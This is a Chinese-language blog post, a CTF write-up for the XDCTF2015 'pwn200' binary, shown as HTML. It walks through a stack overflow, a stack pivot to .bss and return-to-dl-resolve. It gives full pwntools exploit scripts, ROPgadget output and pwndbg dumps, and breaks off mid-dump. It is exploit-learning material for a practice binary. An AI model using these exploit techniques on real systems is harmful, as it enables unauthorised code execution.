@@ -1,0 +1,593 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html lang="">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 3.9.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.4.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.4.0">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.4.0">
+  <link rel="mask-icon" href="/images/logo.svg?v=7.4.0" color="#222">
+  <link rel="alternate" href="/atom.xml" title="ZERO-A-ONE" type="application/atom+xml">
+
+<link rel="stylesheet" href="/css/main.css?v=7.4.0">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.4.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    copycode: {"enable":false,"show_result":false,"style":null},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: 'search.xml',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: 'Kopieren',
+      copy_success: 'Kopiert',
+      copy_failure: 'Kopieren fehlgeschlagen'
+    },
+    sidebarPadding: 40
+  };
+</script>
+
+  <meta name="description" content="先检查一下文件 12345Arch:     i386-32-littleRELRO:    Partial RELROStack:    No canary foundNX:       NX enabledPIE:      No PIE (0x8048000)   在 IDA中反汇编看看 程序是什么样的，这是我们发现程序存在漏洞 1234567ssize_t vuln()&amp;#123;  ch">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwn200">
+<meta property="og:url" content="http://yoursite.com/2019/10/15/pwn200/index.html">
+<meta property="og:site_name" content="ZERO-A-ONE">
+<meta property="og:description" content="先检查一下文件 12345Arch:     i386-32-littleRELRO:    Partial RELROStack:    No canary foundNX:       NX enabledPIE:      No PIE (0x8048000)   在 IDA中反汇编看看 程序是什么样的，这是我们发现程序存在漏洞 1234567ssize_t vuln()&amp;#123;  ch">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/image003.jpg">
+<meta property="og:image" content="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/QQ%E5%9B%BE%E7%89%8720191015221035.png">
+<meta property="og:updated_time" content="2019-10-16T05:52:34.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="pwn200">
+<meta name="twitter:description" content="先检查一下文件 12345Arch:     i386-32-littleRELRO:    Partial RELROStack:    No canary foundNX:       NX enabledPIE:      No PIE (0x8048000)   在 IDA中反汇编看看 程序是什么样的，这是我们发现程序存在漏洞 1234567ssize_t vuln()&amp;#123;  ch">
+<meta name="twitter:image" content="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/image003.jpg">
+  <link rel="canonical" href="http://yoursite.com/2019/10/15/pwn200/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true,
+    isPage: false,
+    isArchive: false
+  };
+</script>
+
+  <title>pwn200 | ZERO-A-ONE</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">ZERO-A-ONE</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Navigationsleiste an/ausschalten">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+      
+      
+      
+        
+        <li class="menu-item menu-item-home">
+      
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Startseite</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-archives">
+      
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archiv</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a href="javascript:;" class="popup-trigger">
+        
+          <i class="menu-item-icon fa fa-search fa-fw"></i> <br>Suche</a>
+      </li>
+    
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="none"
+           placeholder="Suche..." spellcheck="false"
+           type="text" id="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+     <article itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block post">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/10/15/pwn200/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="ZERO-A-ONE">
+      <meta itemprop="description" content="Resit much,Obey little">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ZERO-A-ONE">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">pwn200
+
+          
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Veröffentlicht am</span>
+
+              
+                
+              
+
+              <time title="Erstellt: 2019-10-15 07:50:43 / Geändert am: 22:52:34" itemprop="dateCreated datePublished" datetime="2019-10-15T07:50:43-07:00">2019-10-15</time>
+            </span>
+          
+            
+
+            
+          
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>先检查一下文件</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x8048000</span>)</span></span></span><br></pre></td></tr></table></figure>
+
+<p> 在 IDA中反汇编看看 程序是什么样的，这是我们发现程序存在漏洞</p>
+<figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> vuln()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+Ch] [ebp-6Ch]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, &amp;buf);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里存在着栈溢出漏洞，虽然程序存在 write 写函数 但是我要学会的是 return-to-dl-resolve 所以我们不利用write函数去泄露 </p>
+<p>这道题首先为了让构造的 ROP 链的长度合适，这里我们可以用到栈迁移</p>
+<ul>
+<li>首先我们要 将我们想迁移到的地址 覆盖到 程序的 ebp 上这样 执行下一个 汇编指令时 会将 这个值 赋值给 <strong>ebp （pop ebp）</strong></li>
+<li>然后我们要在下面调用一次 <strong>leave ret (mov esp, ebp ; pop ebp ;)</strong>这样我们就能将esp 也迁移过去 从而实现栈迁移 </li>
+</ul>
+<p>用<strong>ROPgadget</strong>工具找到 我们需要的汇编指令的地址</p>
+<figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">syc@ubuntu:~/Downloads/retdll$ ROPgadget --binary bof --only 'pop|ret'</span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line"><span class="number">0x0804861b</span> : pop ebp ; ret</span><br><span class="line"><span class="number">0x08048618</span> : pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line"><span class="number">0x08048379</span> : pop ebx ; ret</span><br><span class="line"><span class="number">0x0804861a</span> : pop edi ; pop ebp ; ret</span><br><span class="line"><span class="number">0x08048619</span> : pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line"><span class="number">0x08048362</span> : ret</span><br><span class="line"><span class="number">0x0804846e</span> : ret <span class="number">0xeac1</span></span><br><span class="line"></span><br><span class="line">Unique gadgets found: <span class="number">7</span></span><br><span class="line">syc@ubuntu:~/Downloads/retdll$ ROPgadget --binary bof --only 'leave|ret'</span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line"><span class="number">0x08048458</span> : leave ; ret</span><br><span class="line"><span class="number">0x08048362</span> : ret</span><br><span class="line"><span class="number">0x0804846e</span> : ret <span class="number">0xeac1</span></span><br><span class="line"></span><br><span class="line">Unique gadgets found: <span class="number">3</span></span><br><span class="line">syc@ubuntu:~/Downloads/retdll$ readelf -S bof | grep <span class="string">".bss"</span></span><br><span class="line">  [<span class="number">26</span>] .bss              NOBITS          <span class="number">0804</span>a040 <span class="number">001028</span> <span class="number">00000</span>c <span class="number">00</span>  WA  <span class="number">0</span>   <span class="number">0</span> <span class="number">32</span></span><br></pre></td></tr></table></figure>
+
+<p>找到所需要的<strong>ROP</strong>链的部分，如果我们将<strong>payload</strong>写为下面这样运行就能实现栈迁移，将<strong>ebp</strong>覆盖为我们想要迁移过去的值 ，然后执行<strong>leave_ret</strong>就能将栈迁移过去 </p>
+<p>具体的Exploit为</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./bof'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./bof'</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line">offset_ebp = <span class="number">0x6c</span></span><br><span class="line">ppp_ret = <span class="number">0x08048619</span> <span class="comment">#pop esi ; pop edi ; pop ebp ; ret</span></span><br><span class="line">pop_ebp_ret = <span class="number">0x0804861b</span> <span class="comment">#pop ebp ; ret</span></span><br><span class="line">leave_ret = <span class="number">0x08048458</span> <span class="comment">#leave ; ret</span></span><br><span class="line">bss_addr = <span class="number">0x0804a040</span> <span class="comment"># readelf -S pwn1 | grep ".bss"</span></span><br><span class="line">stack_size = <span class="number">0x800</span></span><br><span class="line">base_stage = bss_addr + stack_size</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Welcome to XDCTF2015~!\n'</span>)</span><br><span class="line">payload = <span class="string">''</span></span><br><span class="line">payload+= <span class="string">'a'</span>*offset_ebp</span><br><span class="line">payload+= p32(base_stage)</span><br><span class="line">payload+= p32(leave_ret)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>GDB调试环节</p>
+<figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[DEBUG] Received <span class="number">0x17</span> bytes:</span><br><span class="line">    'Welcome to XDCTF2015~!\n'</span><br><span class="line">[DEBUG] Sent <span class="number">0x75</span> bytes:</span><br><span class="line">    <span class="number">00000000</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  │aaaa│aaaa│aaaa│aaaa│</span><br><span class="line">    *</span><br><span class="line">    <span class="number">00000060</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  <span class="number">40</span> a8 <span class="number">04</span> <span class="number">08</span>  │aaaa│aaaa│aaaa│@···│</span><br><span class="line">    <span class="number">00000070</span>  <span class="number">58</span> <span class="number">84</span> <span class="number">04</span> <span class="number">08</span>  <span class="number">0</span>a                                     │X···│·│</span><br><span class="line">    <span class="number">00000075</span></span><br></pre></td></tr></table></figure>
+
+<p>发送payload后，EBP已经被覆盖为我们布置好的FakeStack地址了，也就bss段地址</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">─────────────────────────────────[ REGISTERS ]──────────────────────────────────</span><br><span class="line"> EAX  <span class="number">0x75</span></span><br><span class="line"> EBX  <span class="number">0x0</span></span><br><span class="line"> ECX  0xffe1207c ◂— 0x61616161 ('aaaa')</span><br><span class="line"> EDX  <span class="number">0x100</span></span><br><span class="line"> EDI  <span class="number">0xffe12160</span> —▸ <span class="number">0xffe12180</span> ◂— <span class="number">0x1</span></span><br><span class="line"> ESI  <span class="number">0xf7ef7000</span> (_GLOBAL_OFFSET_TABLE_) ◂— <span class="number">0x1b1db0</span></span><br><span class="line"> EBP  <span class="number">0x804a840</span> ◂— <span class="number">0x0</span></span><br><span class="line"> ESP  <span class="number">0xffe120ec</span> —▸ <span class="number">0x8048458</span> (deregister_tm_clones+<span class="number">40</span>) ◂— leave  </span><br><span class="line"> EIP  <span class="number">0x804851e</span> (vuln+<span class="number">51</span>) ◂— ret    </span><br><span class="line">───────────────────────────────────[ DISASM ]───────────────────────────────────</span><br><span class="line">   <span class="number">0x8048519</span> &lt;vuln+<span class="number">46</span>&gt;                    add    esp, <span class="number">0x10</span></span><br><span class="line">   <span class="number">0x804851c</span> &lt;vuln+<span class="number">49</span>&gt;                    nop    </span><br><span class="line">   <span class="number">0x804851d</span> &lt;vuln+<span class="number">50</span>&gt;                    leave  </span><br><span class="line"> ► <span class="number">0x804851e</span> &lt;vuln+<span class="number">51</span>&gt;                    ret             &lt;<span class="number">0x8048458</span>; deregister_tm_clones+<span class="number">40</span>&gt;</span><br><span class="line">    ↓</span><br><span class="line">   <span class="number">0x8048458</span> &lt;deregister_tm_clones+<span class="number">40</span>&gt;    leave  </span><br><span class="line">   <span class="number">0x8048459</span> &lt;deregister_tm_clones+<span class="number">41</span>&gt;    ret    </span><br><span class="line"> </span><br><span class="line">   <span class="number">0x804845b</span> &lt;deregister_tm_clones+<span class="number">43</span>&gt;    nop    </span><br><span class="line">   <span class="number">0x804845c</span> &lt;deregister_tm_clones+<span class="number">44</span>&gt;    lea    esi, [esi]</span><br><span class="line">   <span class="number">0x8048460</span> &lt;register_tm_clones&gt;         mov    eax, <span class="number">0x804a028</span></span><br><span class="line">   <span class="number">0x8048465</span> &lt;register_tm_clones+<span class="number">5</span>&gt;       sub    eax, <span class="number">0x804a028</span></span><br><span class="line">   <span class="number">0x804846a</span> &lt;register_tm_clones+<span class="number">10</span>&gt;      sar    eax, <span class="number">2</span></span><br></pre></td></tr></table></figure>
+
+<p> ret地址为leave ret的地址，将EBP的值交给ESP从而达到栈迁移 ，此时ESP已经bss段上</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">─────────────────────────────────[ REGISTERS ]──────────────────────────────────</span><br><span class="line"> EAX  0x75</span><br><span class="line"> EBX  0x0</span><br><span class="line"> ECX  0xffe1207c ◂— 0x61616161 (&apos;aaaa&apos;)</span><br><span class="line"> EDX  0x100</span><br><span class="line"> EDI  0xffe12160 —▸ 0xffe12180 ◂— 0x1</span><br><span class="line"> ESI  0xf7ef7000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0</span><br><span class="line"> EBP  0x0</span><br><span class="line"> ESP  0x804a844 ◂— 0x0</span><br><span class="line"> EIP  0x8048459 (deregister_tm_clones+41) ◂— ret    </span><br><span class="line">───────────────────────────────────[ DISASM ]───────────────────────────────────</span><br><span class="line">   0x8048519 &lt;vuln+46&gt;                    add    esp, 0x10</span><br><span class="line">   0x804851c &lt;vuln+49&gt;                    nop    </span><br><span class="line">   0x804851d &lt;vuln+50&gt;                    leave  </span><br><span class="line">   0x804851e &lt;vuln+51&gt;                    ret    </span><br><span class="line">    ↓</span><br><span class="line">   0x8048458 &lt;deregister_tm_clones+40&gt;    leave  </span><br><span class="line"> ► 0x8048459 &lt;deregister_tm_clones+41&gt;    ret    &lt;0&gt;</span><br></pre></td></tr></table></figure>
+
+<p>查看一下栈的情况，已经实现了栈迁移</p>
+<figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; <span class="built_in">stack</span> <span class="number">30</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ esp  <span class="number">0x804a844</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓</span><br></pre></td></tr></table></figure>
+
+<p>但是我们是想要让我们布置好的数据在这个<strong>fake stack</strong>上 </p>
+<ul>
+<li><p>我们就需要先到用<strong>read</strong>函数向这个地方写入<strong>ROP</strong>链从而能实现调用。因为又<strong>leave ret</strong>会有一个<strong>pop ebp</strong>所以在布置<strong>fake stack</strong>的时候我首先要输入对应大小的<strong>fake_ebp</strong></p>
+</li>
+<li><p>将我们要用到的<strong>ROP</strong>链布置到<strong>bss</strong>段上从而实现布置更长的<strong>ROP</strong>链。这样我们就知道如何去 控制我们需要的指令了</p>
+<p>接着我们需要做的就是通过实现<strong>return-to-dl-resolv</strong>实现<strong>get shell</strong> </p>
+</li>
+<li><p>首先控制到PLT[0]修改我们函数的<strong>index_offset</strong>让其指向我们构造的<strong>fake_reloc</strong> </p>
+</li>
+<li><p>控制<strong>index_offset</strong> 的关键是我们只需要在<strong>PLT[0]</strong>的下一个栈地址放上<strong>index_offset</strong>就行 （因为<strong>index_offset</strong>是在<strong>call</strong>函数后<strong>Push</strong>进栈的地址刚好在返回<strong>PLT[0]</strong>时的栈顶） </p>
+</li>
+</ul>
+<p>我们先写一个Exploit尝试在假栈上部署一下数据</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./bof'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./bof'</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line">read_plt = elf.plt[<span class="string">'read'</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">'write'</span>]</span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line"></span><br><span class="line">offset = <span class="number">112</span></span><br><span class="line">ppp_ret = <span class="number">0x08048619</span> <span class="comment">#pop esi ; pop edi ; pop ebp ; ret</span></span><br><span class="line">pop_ebp_ret = <span class="number">0x0804861b</span> <span class="comment">#pop ebp ; ret</span></span><br><span class="line">leave_ret = <span class="number">0x08048458</span> <span class="comment">#leave ; ret</span></span><br><span class="line">bss_addr = <span class="number">0x0804a040</span> <span class="comment"># readelf -S pwn1 | grep ".bss"</span></span><br><span class="line">stack_size = <span class="number">0x800</span></span><br><span class="line">base_stage = bss_addr + stack_size</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Welcome to XDCTF2015~!\n'</span>)</span><br><span class="line">payload = <span class="string">'A'</span> * offset</span><br><span class="line">payload += p32(base_stage) </span><br><span class="line">payload += p32(read_plt)  </span><br><span class="line">payload += p32(ppp_ret)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(base_stage)  </span><br><span class="line">payload += p32(<span class="number">100</span>)</span><br><span class="line">payload += p32(pop_ebp_ret)</span><br><span class="line">payload += p32(base_stage+<span class="number">4</span>)</span><br><span class="line">payload += p32(leave_ret)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">cmd = <span class="string">"/bin/sh"</span></span><br><span class="line">plt_0 = <span class="number">0x08048380</span> <span class="comment"># objdump -d -j .plt bof</span></span><br><span class="line">index_offset = <span class="number">0x20</span> <span class="comment"># write's index</span></span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">'AAAA'</span></span><br><span class="line">payload2 += p32(plt_0)</span><br><span class="line">payload2 += p32(index_offset)</span><br><span class="line">payload2 += <span class="string">'AAAA'</span></span><br><span class="line">payload2 += p32(<span class="number">1</span>)</span><br><span class="line">payload2 += p32(base_stage + <span class="number">80</span>)</span><br><span class="line">payload2 += p32(len(cmd))</span><br><span class="line">payload2 += <span class="string">'A'</span> * (<span class="number">80</span> - len(payload2))</span><br><span class="line">payload2 += cmd + <span class="string">'\x00'</span></span><br><span class="line">payload2 += <span class="string">'A'</span> * (<span class="number">100</span> - len(payload2))</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>这里有个坑两次payload不能发送太快，需要sleep或者pause一下，否则会当作一次输入</p>
+</blockquote>
+<p>一直运行直到ESP被修改为假栈</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">──────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────</span><br><span class="line"> EAX  <span class="number">0x64</span></span><br><span class="line"> EBX  <span class="number">0x0</span></span><br><span class="line"> ECX  0x804a840 ◂— 0x41414141 ('AAAA')</span><br><span class="line"> EDX  <span class="number">0x64</span></span><br><span class="line"> EDI  0x804a840 ◂— 0x41414141 ('AAAA')</span><br><span class="line"> ESI  <span class="number">0x0</span></span><br><span class="line"> EBP  <span class="number">0x8048380</span> ◂— push   dword ptr [<span class="number">0x804a004</span>]</span><br><span class="line"> ESP  <span class="number">0x804a848</span> ◂— <span class="number">0x20</span> <span class="comment">/* ' ' */</span></span><br><span class="line"> EIP  <span class="number">0x8048459</span> (deregister_tm_clones+<span class="number">41</span>) ◂— ret    </span><br><span class="line">───────────────────────────────────────────[ DISASM ]────────────────────────────────────────────</span><br><span class="line">   <span class="number">0x804861b</span> &lt;__libc_csu_init+<span class="number">91</span>&gt;         pop    ebp</span><br><span class="line">   <span class="number">0x804861c</span> &lt;__libc_csu_init+<span class="number">92</span>&gt;         ret    </span><br><span class="line">    ↓</span><br><span class="line">   <span class="number">0x804861b</span> &lt;__libc_csu_init+<span class="number">91</span>&gt;         pop    ebp</span><br><span class="line">   <span class="number">0x804861c</span> &lt;__libc_csu_init+<span class="number">92</span>&gt;         ret    </span><br><span class="line">    ↓</span><br><span class="line">   <span class="number">0x8048458</span> &lt;deregister_tm_clones+<span class="number">40</span>&gt;    leave  </span><br><span class="line"> ► <span class="number">0x8048459</span> &lt;deregister_tm_clones+<span class="number">41</span>&gt;    ret    &lt;<span class="number">32</span>&gt;</span><br></pre></td></tr></table></figure>
+
+<p> 这个时候已经在fake stack上布置好了ROP链</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x804a840</span></span><br><span class="line">00:0000│ ecx edi  0x804a840 ◂— 0x41414141 ('AAAA')</span><br><span class="line"><span class="number">01</span>:<span class="number">0004</span>│          <span class="number">0x804a844</span> —▸ <span class="number">0x8048380</span> ◂— push   dword ptr [<span class="number">0x804a004</span>]</span><br><span class="line"><span class="number">02</span>:<span class="number">0008</span>│ esp      <span class="number">0x804a848</span> ◂— <span class="number">0x20</span> <span class="comment">/* ' ' */</span></span><br><span class="line">03:000c│          0x804a84c ◂— 0x41414141 ('AAAA')</span><br><span class="line"><span 